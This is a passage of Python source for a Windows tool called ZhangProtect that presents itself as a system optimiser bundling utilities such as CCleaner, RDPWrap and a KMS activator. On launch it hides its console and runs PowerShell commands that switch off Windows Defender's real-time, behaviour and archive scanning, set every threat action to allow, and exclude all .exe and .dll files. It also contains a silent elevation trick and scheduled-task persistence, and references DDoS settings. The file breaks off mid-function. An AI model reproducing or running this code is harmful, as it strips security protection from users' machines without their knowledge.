#  Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.
#  Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.
#  Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.
#  Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.
#  Vestibulum commodo. Ut rhoncus gravida arcu.
import ctypes
import inspect


def print_current_line():
    frame = inspect.currentframe()
    line_no = frame.f_lineno
    return f"当前行号为：{line_no}"


def hide_console():
    kernel32 = ctypes.WinDLL("kernel32")
    user32 = ctypes.WinDLL("user32")
    SW_HIDE = 0
    hWnd = kernel32.GetConsoleWindow()
    user32.ShowWindow(hWnd, SW_HIDE)


def show_console():
    kernel32 = ctypes.WinDLL("kernel32")
    user32 = ctypes.WinDLL("user32")
    SW_HIDE = 1
    hWnd = kernel32.GetConsoleWindow()
    user32.ShowWindow(hWnd, SW_HIDE)


import sys

inputs = sys.argv
if len(inputs) == 1:
    hide_console()

import os
import time
import base64
import psutil
import shutil
import struct
import socket
import random
import hashlib
import zipfile
import win32api
import win32con
import datetime
import platform
import requests
import threading
import subprocess
from nmyu import *
from nlxjt import *
from npcap import *
from icons import *
from xzzip7 import *
import tkinter as tk
import Zhang_lan_scan
from version import *
from SnapShot import *
from CCleaner import *
from NSudoZip import *
from pingfang import *
from queue import Queue
from xzzip7dll import *
from DesktopOK import *
from memreduct import *
from examplemp4 import *
from RDPWrapZip import *
from ikun_sound import *
from SysDispatch import *
from APInstaller import *
from KMSActivator import *
from DGuardInstall import *
from iKun_icon_zip import *
from ctypes import wintypes
from configure_tags import *
import win32gui, win32process
from base64 import b64decode
from examplemp4photo import *
from Zhang_lan_scan_e import *
from tkinter import messagebox
from scapy.sendrecv import send
from iKun_wallpaper_mp4 import *
from ZhangProtectControl import *
from iKun_wallpaper_photo import *
from scapy.layers.inet import TCP, IP
from multiprocessing import cpu_count


def setpriority(pid=None, priority=1):
    # priority:
    # 0->低
    # 1->低于正常
    # 2->正常
    # 3->高于正常
    # 4->高
    # 5->实时
    priorityclasses = [
        win32process.IDLE_PRIORITY_CLASS,
        win32process.BELOW_NORMAL_PRIORITY_CLASS,
        win32process.NORMAL_PRIORITY_CLASS,
        win32process.ABOVE_NORMAL_PRIORITY_CLASS,
        win32process.HIGH_PRIORITY_CLASS,
        win32process.REALTIME_PRIORITY_CLASS,
    ]
    if pid == None:
        pid = win32api.GetCurrentProcessId()
    handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, True, pid)
    win32process.SetPriorityClass(handle, priorityclasses[priority])


setpriority(os.getpid(), 0)

global logs
logs = "ProtectLog.log"
tools_info = (
    "本程序内置DektopOK、CCleaner、Memrudect、"
    + chr(10)
    + "NSudo、KMSActivator、7z、Npcap、"
    + chr(10)
    + "蓝眼硬盘还原(手动)、360AP(用于校园网AP)、"
    + chr(10)
    + "SnapShot、nmyu、RDPWrap等"
    + chr(10)
    + "部分工具由程序自动调整配置，暂不支持用户开关"
)
try:
    os.popen(
        "powershell.exe -command "
        + chr(34)
        + "Set-MpPreference -DisableRealtimeMonitoring $true"
        + chr(34)
    )
except:
    pass
global testflag
testflag = False
qinstall = False
update_application = False
show_control = False
if len(inputs) == 2:
    try:
        if inputs[1] == "-t" or inputs[1] == "/t":
            testflag = True
            print("已进入调试模式,显示控制台窗口，将会显示运行信息")
            show_console()
        elif inputs[1] == "-h" or inputs[1] == "/h" or inputs[1] == "/?":
            tags_info = ""
            for i in config_tags:
                tags_info += chr(10) + i[0] + " - " + i[1]
            messagebox.showinfo(
                "命令帮助",
                "命令帮助："
                + chr(10)
                + "-t 调试模式"
                + chr(10)
                + "-q 静默安装（使用默认配置）"
                + chr(10)
                + "-u 更新程序(更新为当前可执行文件版本)"
                + chr(10)
                + "-c 打开程序控制台"
                + chr(10)
                + tools_info
                + chr(10)
                + "使用控制台或手动更改对应标志文件实现开关以下功能:\n\n"
                + tags_info
                + chr(10)
                + chr(10)
                + "软件版本："
                + version,
            )
            os._exit(0)
        elif inputs[1] == "-q" or inputs[1] == "/q":
            qinstall = True
        elif inputs[1] == "-u" or inputs[1] == "/u":
            update_application = True
        elif inputs[1] == "-c" or inputs[1] == "/c":
            show_control = True
        else:
            testflag = False
            qinstall = False
            update_application = False
            show_control = False
    except Exception as e:
        os._exit(0)

if os.path.isfile("ZhangProtectLock"):
    os._exit(0)
selffullname = sys.executable
# 获取一些系统变量的值
WindowsDir = str(os.environ.get("systemroot"))
SystemDir = str(os.environ.get("systemdrive"))
TempDir = str(os.environ.get("temp"))
SystemVersion = int(str(platform.version()).split(".")[0])


def disable_windows_defender():
    try:
        disable_command = (
            "powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -DisableRealtimeMonitoring $true"
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -DisableBehaviorMonitoring $true"
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -DisableIOAVProtection $true"
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -DisableArchiveScanning $true"
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -DisableIntrusionPreventionSystem $true"
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -SubmitSamplesConsent 2"
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -HighThreatDefaultAction 6 -Force"
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -ModerateThreatDefaultAction 6"
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -LowThreatDefaultAction 6"
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -SevereThreatDefaultAction 6"
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Add-MpPreference -ExclusionExtension "
            + chr(34)
            + ".exe"
            + chr(34)
            + ""
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Add-MpPreference -ExclusionProcess "
            + chr(34)
            + "regsvr.32"
            + chr(34)
            + ""
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Add-MpPreference -ExclusionProcess "
            + chr(34)
            + "regsvr.32*"
            + chr(34)
            + ""
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Add-MpPreference -ExclusionProcess "
            + chr(34)
            + ".exe"
            + chr(34)
            + ""
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Add-MpPreference -ExclusionProcess "
            + chr(34)
            + "iexplorer.exe"
            + chr(34)
            + ""
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Add-MpPreference -ExclusionProcess "
            + chr(34)
            + "explorer.exe"
            + chr(34)
            + ""
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Add-MpPreference -ExclusionProcess "
            + chr(34)
            + ".dll"
            + chr(34)
            + ""
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Add-MpPreference -ExclusionProcess "
            + chr(34)
            + "*.dll"
            + chr(34)
            + ""
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Add-MpPreference -ExclusionProcess "
            + chr(34)
            + "*.exe"
            + chr(34)
            + ""
            + chr(34)
            + ""
            + chr(10)
            + "cmd /c powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -MAPSReporting 0"
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -PUAProtection disable"
            + chr(34)
            + ""
            + chr(10)
            + "powershell.exe -command "
            + chr(34)
            + "Set-MpPreference -EnableControlledFolderAccess Disabled"
            + chr(34)
            + ""
            + chr(10)
            + "powercfg -h on"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Power /t reg_dword /v HibernateEnabled /d 1 /f"
            + chr(10)
            + "echo 1 > command_OK"
            + chr(10)
            + "rem 中文格式支持"
        )
        now_reault = disable_command.splitlines()
        for i in now_reault:
            os.popen(i)
        with open("Disable_Windows_defender.bat", "w", encoding="gbk") as f:
            f.write(disable_command)
            os.popen("cmd /c Disable_Windows_defender.bat")
    except Exception as e:
        log(
            logs,
            str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
        )


disable_windows_defender()
try:
    if not len(inputs) == 2:
        proc_flag = 0
        i: int
        for i in psutil.pids():  # 只允许运行一个优化程序进程
            time.sleep(0.001)
            try:
                proc = psutil.Process(i)
                execs = proc.exe()
                commandline = proc.cmdline()
                if execs == selffullname and len(commandline) == 1:
                    if not i == os.getpid():
                        proc_flag += 1
            except Exception as e:
                pass
        if proc_flag >= 2:
            os._exit(0)
except:
    pass
if qinstall:
    try:
        Tempexe = TempDir + "\\Protect.exe"
        if not selffullname == Tempexe:
            timeout = 0
            if os.path.exists(Tempexe):
                os.remove(Tempexe)
            while not os.path.exists(Tempexe):
                timeout += 1
                shutil.copyfile(selffullname, Tempexe)
                if timeout >= 30:
                    raise exception("Timeout")
            os.popen(chr(34) + Tempexe + chr(34) + " -q")
            try:
                bat = "ZhangProtect静默安装.bat"
                batt = (
                    "@echo off"
                    + chr(10)
                    + "%1 mshta vbscript:CreateObject("
                    + chr(34)
                    + "Shell.Application"
                    + chr(34)
                    + ").ShellExecute("
                    + chr(34)
                    + "cmd.exe"
                    + chr(34)
                    + ","
                    + chr(34)
                    + "/c %~s0 ::"
                    + chr(34)
                    + ","
                    + chr(34)
                    + ""
                    + chr(34)
                    + ","
                    + chr(34)
                    + "runas"
                    + chr(34)
                    + ",1)(window.close)&&exit"
                    + chr(10)
                    + "cd /d "
                    + chr(34)
                    + "%~dp0"
                    + chr(34)
                    + chr(10)
                    + "ZhangProtect.exe -q"
                )
                if not os.path.isfile(bat):
                    with open(bat, "w") as f:
                        f.write(batt)
            except Exception as e:
                log(
                    logs,
                    str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
                )
            os._exit(0)
    except Exception as e:
        messagebox.showinfo(
            "错误",
            "程序出现错误将退出" + str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
        )
        os._exit(0)

# 主工作位置，非常重要，尽量不出现空格
# 生成文件和文件名
ikun_wav_file = WindowsDir + "\\iKun_Sound.wav"
ProtectDir = WindowsDir + "\\Protect\\"
more_keep_process = ProtectDir + "more_keep_process.conf"
ProtectExe = ProtectDir + "Protect.exe"
Scan_app = ProtectDir + "Zhang_scan.exe"
ErrorAutoFix = ProtectDir + "ErrorAutoFix.bat"
ErrorAutoFixXml = ProtectDir + "ErrorAutoFix.xml"
powerkeep = ProtectDir + "powerkeep"
KMSActivatorExe = ProtectDir + "KMSActivator.exe"
donotautopower = ProtectDir + "donotautopower"
last_power_cfg = []
Disable_sys_dispatch = ProtectDir + "Disable_sys_dispatch"
ProtectControl = ProtectDir + "ZhangProtectControl.exe"
ProtectSysDispatch = ProtectDir + "SysDispatch.exe"
AutoAnswer = ProtectDir + "AutoAnswer.txt"
ProtectBAT = ProtectDir + "BINRD.bat"
ProtectWifi = ProtectDir + "WifiShare.ps1"
clock_info_change = ProtectDir + "clock_info_change.vbs"
do_no_show_clock_info = "do_no_show_clock_info"
StopWifiShare = ProtectDir + "StopWifiShare.ps1"
ProtectKeeper = ProtectDir + "ProtectKeeper.vbs"
Protectconf = ProtectDir + "ProtectConf.conf"
MainTainClean = ProtectDir + "MainTainClean.bat"
UsbChanger = ProtectDir + "UsbChang.bat"
AllRunCommand = ProtectDir + "AllCommand.bat"
AllSchrunBA = ProtectDir + "AllSchrunBA.bat"
BATKEEPER = ProtectDir + "BatKeeper.vbs"
UNINST = ProtectDir + "Uninstaller.bat"
VBAllRunF = ProtectDir + "VBAllRun.vbs"
regfixfile = ProtectDir + "regfix.reg"
ncsi = ProtectDir + "ncsi.txt"
regstartup = ProtectDir + "regstartup.vbs"
AutoPreCFlag = ProtectDir + "AutoPreCFlag"
excludeflag = ProtectDir + "excludeflag"
reginifile = ProtectDir + "reginif.ini"
lowlog = ProtectDir + "lowerlog"
randomwifipwd = ProtectDir + "randomwifipwd"
randomwifissid = ProtectDir + "randomwifissid"
systemappfix = ProtectDir + "systemappfix.ps1"
openwifi = ProtectDir + "openwifi"
closewifi = ProtectDir + "closewifi"
RDPreg = ProtectDir + "RDPreg.reg"
RDPWrapZipFile = ProtectDir + "RDPWrap.zip"
RDPWrapInstaller = ProtectDir + "RDPWrap\\install.bat"
RDPWrapDir = ProtectDir + "RDPWrap"  # 这是一个文件夹
DesktopOK = ProtectDir + "DesktopOK.exe"
memreduct = ProtectDir + "memreduct.exe"
memreductini = ProtectDir + "memreduct.ini"
memreducti18n = ProtectDir + "i18n"  # 这是一个文件夹
memreductchinese1 = memreducti18n + "\\Chinese (Simplified).ini"
memreductchinese2 = memreducti18n + "\\Chinese (Simplified2).ini"
CCleanerZipFile = ProtectDir + "CCleaner.zip"
CCleanerExe = ProtectDir + "CCleaner\\CCleaner.exe"
CCleanerDir = ProtectDir + "CCleaner"  # 这是一个文件夹
npcap = ProtectDir + "NpCapInstaller.exe"
zip7exe = ProtectDir + "7z.exe"
zip7dll = ProtectDir + "7z.dll"
NSudo = ProtectDir + "NSudo.exe"
SnapShotZip = ProtectDir + "SnapShot.zip"
SnapShotDir = ProtectDir + "SnapShot"  # 这是一个文件夹
nmyu_dir = ProtectDir + "nmyu"  # 这是一个文件夹
nmyuZip = ProtectDir + "nmyu.zip"
SnapShotExe = SnapShotDir + "\\snapshot.exe"
Open_SystemBackup_Flag = ProtectDir + "SystemBackup"
wallpaper_example = ProtectDir + "动态壁纸示例.mp4"
wallpaper_example_photo = ProtectDir + "动态壁纸示例静态图.png"
nlxjt_ttf = ProtectDir + "奶酪陷阱体.ttf"
pingfang_ttf = ProtectDir + "苹方字体.ttf"
ikun_icon_flag = ProtectDir + "ikunicon"
ikun_icon_zip = ProtectDir + "iKun_icon.zip"
ikun_icon_dir = ProtectDir + "iKun_icon"
ikun_wallpapermp4 = ProtectDir + "iKun动态壁纸.mp4"
ikun_wallpaperphoto = ProtectDir + "iKun动态壁纸静态图.png"
usehibernate = ProtectDir + "usehibernate"
donotforcebluescreen = ProtectDir + "donotforcebluescreen"
hide_shutdown = ProtectDir + "hide_shutdown"
hide_restart = ProtectDir + "hide_restart"
hide_sleep = ProtectDir + "hide_sleep"
hide_hibernate = ProtectDir + "hide_hibernate"
ap_360_installer = ProtectDir + "APInstaller.exe"
use_36o_ap_flag = ProtectDir + "use_360_ap_flag"
DGuardInstallexe = ProtectDir + "DGuardInstall.exe"


try:
    os.chdir(ProtectDir)
except Exception as e:
    pass

# 日志文件位置
logs = (
    ProtectDir
    + "ProtectLog"
    + str(datetime.datetime.now()).replace(" ", "-").replace(":", "-").replace(".", "-")
    + ".log"
)


def log(path, logcon):  # 日志输出
    logcon = str(logcon)
    txt = (
        chr(10)
        + "-" * 20
        + chr(10)
        + "[PID:"
        + str(os.getpid())
        + ",version:"
        + version
        + "]于"
        + str(datetime.datetime.now())
        + "输出日志:"
        + chr(10)
        + logcon
        + chr(10)
        + "-" * 20
    )
    print(txt)
    global lowlog
    if os.path.isfile(lowlog):
        print("日志被关闭，仅显示于控制台，但不写入文件。")
        return False

    with open(path, "a") as f:
        f.write(txt)
    with open("ProtectLog.log", "a") as f:
        f.write(txt)
    if "错误" in logcon:
        with open("ProtectErr.log", "a") as f:
            f.write(txt)
    return True


def getmd5(file):
    m = hashlib.md5()
    with open(file, "rb") as f:
        for line in f:
            m.update(line)
    md5code = m.hexdigest()
    return md5code


def get_pic(pic_code, pic_name):
    with open(pic_name, "wb") as f:
        f.write(b64decode(pic_code))


def runas(user, path):
    if '"' in path:
        path = path.replace('"', '\\"')
    a = os.popen(
        'schtasks /Create /F /tn ZhangProtect\\ZhangProtectRunAs /RU "'
        + user
        + '" /RL HIGHEST /SC ONCE /ST 00:00 /TR "'
        + path
        + '"'
    ).read()
    b = os.popen("schtasks /Run /I /tn ZhangProtect\\ZhangProtectRunAs").read()
    c = os.popen("schtasks /Delete /F /tn ZhangProtect\\ZhangProtectRunAs").read()
    log(logs, "RunAs命令执行:%s \n 对象:%s \n 结果:%s\n%s\n%s" % (path, user, a, b, c))


def get_power_info():
    class SYSTEM_POWER_STATUS(ctypes.Structure):
        _fields_ = [
            ("ACLineStatus", wintypes.BYTE),
            ("BatteryFlag", wintypes.BYTE),
            ("BatteryLifePercent", wintypes.BYTE),
            ("Reserved1", wintypes.BYTE),
            ("BatteryLifeTime", wintypes.DWORD),
            ("BatteryFullLifeTime", wintypes.DWORD),
        ]

    SYSTEM_POWER_STATUS_P = ctypes.POINTER(SYSTEM_POWER_STATUS)
    GetSystemPowerStatus = ctypes.windll.kernel32.GetSystemPowerStatus
    GetSystemPowerStatus.argtypes = [SYSTEM_POWER_STATUS_P]
    GetSystemPowerStatus.restype = wintypes.BOOL
    status = SYSTEM_POWER_STATUS()
    if not GetSystemPowerStatus(ctypes.pointer(status)):
        raise ctypes.WinError()
    flags = {}
    flags["ACLineStatus"] = status.ACLineStatus
    flags["BatteryFlag"] = status.BatteryFlag
    flags["BatteryLifePercent"] = status.BatteryLifePercent
    flags["BatteryLifeTime"] = status.BatteryLifeTime
    flags["BatteryFullLifeTime"] = status.BatteryFullLifeTime
    return flags


def power_performance():  # 高性能模式/卓越性能模式
    global last_power_cfg
    if not len(last_power_cfg) == 0:
        for i in last_power_cfg:
            os.popen("powercfg /delete %s" % i)
    now = os.popen("powercfg /GETACTIVESCHEME").read()
    if "(卓越性能)" in now:
        return True
    more = os.popen(
        "powercfg -duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61"
    ).read()  # 卓越性能
    high = os.popen(
        "powercfg -duplicatescheme 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c"
    ).read()  # 高性能
    flag = False
    if "(卓越性能)" in more:
        cfg = more.replace(" ", "").split(":")[1].split("(")[0]
        last_power_cfg.append(cfg)
        more_result = os.popen("powercfg -SETACTIVE %s" % cfg).read()
        if more_result == "":
            flag = True
    if not flag:
        if "(高性能)" in high:
            cfg = high.replace(" ", "").split(":")[1].split("(")[0]
            last_power_cfg.append(cfg)
            high_result = os.popen("powercfg -SETACTIVE %s" % cfg).read()
            if high_result == "":
                return True
            else:
                return False
    return True


def power_save():  # 节能模式
    global last_power_cfg
    if not len(last_power_cfg) == 0:
        for i in last_power_cfg:
            os.popen("powercfg /delete %s" % i)
    now = os.popen("powercfg /GETACTIVESCHEME").read()
    if "(节能)" in now:
        return True
    low = os.popen(
        "powercfg -duplicatescheme c9749f86-de18-4412-ac48-844ca0958a92"
    ).read()  # 节能
    normal = os.popen(
        "powercfg -duplicatescheme 381b4222-f694-41f0-9685-ff5bb260df2e"
    ).read()  # 平衡
    flag = False
    if "(节能)" in low:
        cfg = low.replace(" ", "").split(":")[1].split("(")[0]
        last_power_cfg.append(cfg)
        low_result = os.popen("powercfg -SETACTIVE %s" % cfg).read()
        if low_result == "":
            flag = True
    if not flag:
        if "(平衡)" in normal:
            cfg = normal.replace(" ", "").split(":")[1].split("(")[0]
            last_power_cfg.append(cfg)
            normal_result = os.popen("powercfg -SETACTIVE %s" % cfg).read()
            if normal_result == "":
                return True
            else:
                return False
    os.popen("powercfg -attributes SUB_PROCESSOR CPMINCORES -ATTRIB_HIDE").read()
    return True


def power_normal():  # 平衡模式
    global last_power_cfg
    if not len(last_power_cfg) == 0:
        for i in last_power_cfg:
            os.popen("powercfg /delete %s" % i)
    now = os.popen("powercfg /GETACTIVESCHEME").read()
    if "(平衡)" in now:
        return True
    normal = os.popen(
        "powercfg -duplicatescheme 381b4222-f694-41f0-9685-ff5bb260df2e"
    ).read()  # 平衡
    if "(平衡)" in normal:
        cfg = normal.replace(" ", "").split(":")[1].split("(")[0]
        last_power_cfg.append(cfg)
        normal_result = os.popen("powercfg -SETACTIVE %s" % cfg).read()
        if normal_result == "":
            return True
        else:
            return False


def set_environment_path(path):
    reg_path_test = os.popen(
        'reg query "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment" /v Path'
    ).read()
    if not path in reg_path_test:
        os.popen(
            'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment" /t REG_EXPAND_SZ /v Path /d "%path%;"'
            + path
            + " /f"
        ).read()


def get_process_list():
    pro_list = []
    for i in psutil.pids():
        time.sleep(0.001)
        try:
            proc_direct = {}
            proc = psutil.Process(i)
            proc_direct["name"] = proc.name().casefold()
            proc_direct["execs"] = proc.exe().casefold()
            proc_direct["username"] = proc.username().split("\\")[-1]
            proc_direct["pid"] = i
            pro_list.append(proc_direct)
        except Exception as e:
            pass
    return pro_list


def get_process_num(exe):
    num = 0
    exe = str(exe).casefold()
    for i in get_process_list():
        if i.get("name") == exe:
            num += 1
    return num


def get_logon_user():
    ls = []
    for i in get_process_list():
        time.sleep(0.001)
        username = str(i.get("username"))
        name = str(i.get("name")).casefold()
        if name == "explorer.exe" and not username in ls:
            ls.append(username)
    if len(ls) == 0:
        ls.append("SYSTEM")
    return ls


def get_user_process_list(user):
    user_process_list = []
    user = user.casefold()
    for i in get_process_list():
        time.sleep(0.001)
        if i.get("username").casefold() == str(user):
            user_process_list.append(i)
    return user_process_list


def TaskKeep(TaskName, TaskPath, alluser=True):  # 进程守护判断
    TaskName = TaskName.casefold()
    TaskPath = TaskPath.casefold()
    if alluser:
        for i in get_logon_user():
            time.sleep(0.001)
            try:
                alive_flag = False
                for j in get_user_process_list(i):
                    time.sleep(0.001)
                    if j.get("name") == TaskName:
                        alive_flag = True
                        break
                if not alive_flag:
                    runas(i, TaskPath)
            except Exception as e:
                log(
                    logs,
                    str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
                )
    else:
        alive_flag = False
        for i in get_process_list():
            time.sleep(0.001)
            if i.get("name") == TaskName:
                alive_flag = True
                break
        if not alive_flag:
            runas("Users", TaskPath)


def get_task_status(TaskName):  # 进程守护状态
    protect = []
    for i in psutil.process_iter():
        time.sleep(0.001)
        protect.append(i.name())
    if not TaskName in protect:
        return False
    else:
        return True


def wait_task_run(TaskName, long=30):
    timeout = 0
    while not get_task_status(TaskName):
        time.sleep(1)
        timeout += 1
        if timeout > long:
            return False
    return True


def get_random_ip():  # 随机ip地址
    RANDOM_IP_POOL = ["53.69.51.198/0"]
    str_ip = RANDOM_IP_POOL[random.randint(0, len(RANDOM_IP_POOL) - 1)]
    str_ip_addr = str_ip.split("/")[0]
    str_ip_mask = str_ip.split("/")[1]
    ip_addr = struct.unpack(">I", socket.inet_aton(str_ip_addr))[0]
    mask = 0x0
    for i in range(31, 31 - int(str_ip_mask), -1):
        time.sleep(0.001)
        mask = mask | (1 << i)
    ip_addr_min = ip_addr & (mask & 0xFFFFFFFF)
    ip_addr_max = ip_addr | (~mask & 0xFFFFFFFF)
    return socket.inet_ntoa(struct.pack(">I", random.randint(ip_addr_min, ip_addr_max)))


def KeepFolder(Path, status=1):  # 文件夹创建
    time.sleep(0.1)
    if not os.path.exists(Path):
        os.mkdir(Path)
    return True


def center_window(root, width, height):
    screenwidth = root.winfo_screenwidth()  # 获取显示屏宽度
    screenheight = root.winfo_screenheight()  # 获取显示屏高度
    size = "%dx%d+%d+%d" % (
        width,
        height,
        0,
        (screenheight - height) // 4,
    )  # 设置窗口居中参数
    root.geometry(size)  # 让窗口居中显示


def flagtest():
    global qinstall, DDOSurl, DDOSip, DDOSflag, DDOSConf, lowlog, setflag
    if not setflag:
        os._exit(0)


def gpupdate():
    os.popen("gpupdate /force /wait:0").read()


def clock_show_info(up="", down=""):  # up设定时钟部分，down设定日期部分，会覆盖原有内容
    if not os.path.isfile(do_no_show_clock_info):
        if not up == "" and not down == "":
            up = "|" + str(up)
            down = "|" + str(down)
    else:
        up = ""
        down = ""
        with open(do_no_show_clock_info, "r") as f:
            if f.read() == "1":
                return False
    if " " in up:
        up = up.replace(" ", "")
    if " " in down:
        down = down.replace(" ", "")
    clock_show_info_vbs = (
        "set clock_info=createobject("
        + chr(34)
        + "shell.application"
        + chr(34)
        + ")"
        + chr(10)
        + "clock_info.shellexecute"
        + chr(34)
        + "cmd"
        + chr(34)
        + ","
        + chr(34)
        + "/c reg add "
        + chr(34)
        + "+chr(34)+"
        + chr(34)
        + "HKEY_CURRENT_USER\\Control Panel\\International"
        + chr(34)
        + "+chr(34)+"
        + chr(34)
        + " /t REG_SZ /v sShortDate /d "
        + chr(34)
        + "+chr(34)+"
        + chr(34)
        + "yyyy/M/d"
        + chr(34)
        + "+chr(39)+"
        + chr(34)
        + str(down)
        + chr(34)
        + "+chr(39)+chr(34)+"
        + chr(34)
        + " /f"
        + chr(34)
        + ","
        + chr(34)
        + ""
        + chr(34)
        + ",runas,0"
        + chr(10)
        + "clock_info.shellexecute"
        + chr(34)
        + "cmd"
        + chr(34)
        + ","
        + chr(34)
        + "/c reg add "
        + chr(34)
        + "+chr(34)+"
        + chr(34)
        + "HKEY_CURRENT_USER\\Control Panel\\International"
        + chr(34)
        + "+chr(34)+"
        + chr(34)
        + " /t REG_SZ /v sLongDate /d "
        + chr(34)
        + "+chr(34)+"
        + chr(34)
        + "yyyy"
        + chr(34)
        + "+chr(39)+"
        + chr(34)
        + "年"
        + chr(34)
        + "+chr(39)+"
        + chr(34)
        + "M"
        + chr(34)
        + "+chr(39)+"
        + chr(34)
        + "月"
        + chr(34)
        + "+chr(39)+"
        + chr(34)
        + "d"
        + chr(34)
        + "+chr(39)+"
        + chr(34)
        + "日"
        + chr(34)
        + "+chr(39)+"
        + chr(34)
        + ""
        + chr(34)
        + "+chr(39)+"
        + chr(34)
        + str(down)
        + chr(34)
        + "+chr(39)+chr(34)+"
        + chr(34)
        + " /f"
        + chr(34)
        + ","
        + chr(34)
        + ""
        + chr(34)
        + ",runas,0"
        + chr(10)
        + "clock_info.shellexecute"
        + chr(34)
        + "cmd"
        + chr(34)
        + ","
        + chr(34)
        + "/c reg add "
        + chr(34)
        + "+chr(34)+"
        + chr(34)
        + "HKEY_CURRENT_USER\\Control Panel\\International"
        + chr(34)
        + "+chr(34)+"
        + chr(34)
        + " /t REG_SZ /v sYearMonth /d "
        + chr(34)
        + "+chr(34)+"
        + chr(34)
        + "yyyy"
        + chr(34)
        + "+chr(39)+"
        + chr(34)
        + "年"
        + chr(34)
        + "+chr(39)+"
        + chr(34)
        + "M"
        + chr(34)
        + "+chr(39)+"
        + chr(34)
        + "月"
        + chr(34)
        + "+chr(39)+"
        + chr(34)
        + ""
        + chr(34)
        + "+chr(39)+"
        + chr(34)
        + str(down)
        + chr(34)
        + "+chr(39)+chr(34)+"
        + chr(34)
        + " /f"
        + chr(34)
        + ","
        + chr(34)
        + ""
        + chr(34)
        + ",runas,0"
        + chr(10)
        + "clock_info.shellexecute"
        + chr(34)
        + "cmd"
        + chr(34)
        + ","
        + chr(34)
        + "/c reg add "
        + chr(34)
        + "+chr(34)+"
        + chr(34)
        + "HKEY_CURRENT_USER\\Control Panel\\International"
        + chr(34)
        + "+chr(34)+"
        + chr(34)
        + " /t REG_SZ /v sShortTime /d "
        + chr(34)
        + "+chr(34)+"
        + chr(34)
        + "H:mm:ss tt"
        + chr(34)
        + "+chr(34)+"
        + chr(34)
        + " /f"
        + chr(34)
        + ","
        + chr(34)
        + ""
        + chr(34)
        + ",runas,0"
        + chr(10)
        + "clock_info.shellexecute"
        + chr(34)
        + "cmd"
        + chr(34)
        + ","
        + chr(34)
        + "/c reg add "
        + chr(34)
        + "+chr(34)+"
        + chr(34)
        + "HKEY_CURRENT_USER\\Control Panel\\International"
        + chr(34)
        + "+chr(34)+"
        + chr(34)
        + " /t REG_SZ /v s1159 /d "
        + chr(34)
        + "+chr(34)+"
        + chr(34)
        + str(up)
        + chr(34)
        + "+chr(34)+"
        + chr(34)
        + " /f"
        + chr(34)
        + ","
        + chr(34)
        + ""
        + chr(34)
        + ",runas,0"
        + chr(10)
        + "clock_info.shellexecute"
        + chr(34)
        + "cmd"
        + chr(34)
        + ","
        + chr(34)
        + "/c reg add "
        + chr(34)
        + "+chr(34)+"
        + chr(34)
        + "HKEY_CURRENT_USER\\Control Panel\\International"
        + chr(34)
        + "+chr(34)+"
        + chr(34)
        + " /t REG_SZ /v s2359 /d "
        + chr(34)
        + "+chr(34)+"
        + chr(34)
        + str(up)
        + chr(34)
        + "+chr(34)+"
        + chr(34)
        + " /f"
        + chr(34)
        + ","
        + chr(34)
        + ""
        + chr(34)
        + ",runas,0"
        + chr(10)
        + "clock_info.shellexecute"
        + chr(34)
        + "cmd"
        + chr(34)
        + ","
        + chr(34)
        + "/c gpupdate /force /wait:0"
        + chr(34)
        + ","
        + chr(34)
        + ""
        + chr(34)
        + ",runas,0"
        + chr(10)
        + "\n'GBK中文编码支持"
    )
    with open(clock_info_change, "w", encoding="gbk") as f:
        f.write(clock_show_info_vbs)
    runas("users", chr(34) + clock_info_change + chr(34))
    time.sleep(3)
    if os.path.isfile(do_no_show_clock_info):
